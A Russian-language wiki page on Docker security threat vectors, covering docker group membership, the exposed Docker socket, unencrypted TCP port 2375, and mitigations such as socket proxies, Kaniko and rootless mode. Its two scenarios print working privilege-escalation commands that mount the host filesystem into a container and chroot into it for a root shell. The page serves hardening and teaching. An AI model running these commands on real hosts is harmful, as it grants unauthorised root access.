# Векторы угроз Docker

Демон Docker (`dockerd`) по умолчанию работает от `root`. Любой процесс с доступом к Docker API получает полный `root`-доступ к хосту.

## Определения

**Группа `docker`** — пользователи группы могут выполнять команды `docker` без `sudo`. Риск: неконтролируемый доступ к Docker API = `root` на хосте.

**Docker Socket (`/var/run/docker.sock`)** — **[Unix-сокет](../../Networking/Concepts/socket_api.md#unix-сокеты-af_unix)** для локального взаимодействия с демоном. Риск: монтирование в контейнер (`-v /var/run/docker.sock:/var/run/docker.sock`) позволяет управлять демоном на хосте — классический `container escape`.

## Базовые концепции

### 1. Docker Socket

Сокет принадлежит `root:docker` с правами `660`. Запись в сокет = полный контроль над демоном. Доступ необходим для Portainer, GitLab Runner — требуется доверие к образам.

**Альтернативы:**
- **Прокси:** `docker-socket-proxy` для фильтрации API-вызовов.
- **Сборка без демона:** **[Kaniko](../Dockerfile/dockerfile_kaniko.md)**, **[Buildah](../alternative_runtimes_and_tools.md)**.
- **Изолированный dind:** Непривилегированный демон внутри контейнера.

### 2. Сетевой доступ по TCP

- **Порт `2375` (HTTP):** Незашифрованный, полный контроль над демоном.
- **Порт `2376` (HTTPS):** TLS для аутентификации и шифрования.

## Практические сценарии

### Сценарий 1: Доступ через группу `docker`

```sh
docker run -it --rm --privileged -v /:/host busybox:1.36.1 chroot /host
```

### Сценарий 2: Побег из контейнера с проброшенным сокетом

```sh
# 1. Установка docker-cli внутри контейнера
# 2. Запуск привилегированного контейнера с корневой ФС хоста
docker run -it --rm -v /:/host busybox chroot /host

# 3. Результат: root-шелл на хосте
whoami # -> root
```

## Дополнительная информация

**Связанные документы:** **[Защита хоста и демона](./host_daemon_hardening.md)** (userns-remap, Rootless), **[Укрепление контейнеров](./container_hardening.md)** (capabilities, seccomp), **[Механизмы изоляции Linux](../../Docker/Concepts/linux_isolation.md)**, **[Безопасность цепочки поставок](../../Security/Supply_Chain_Security/overview.md)**.

**CIS Docker Benchmark:** Рекомендации 1.1–1.5 (конфигурация хоста), 2.1–2.4 (демон), 4.1–4.6 (образы).
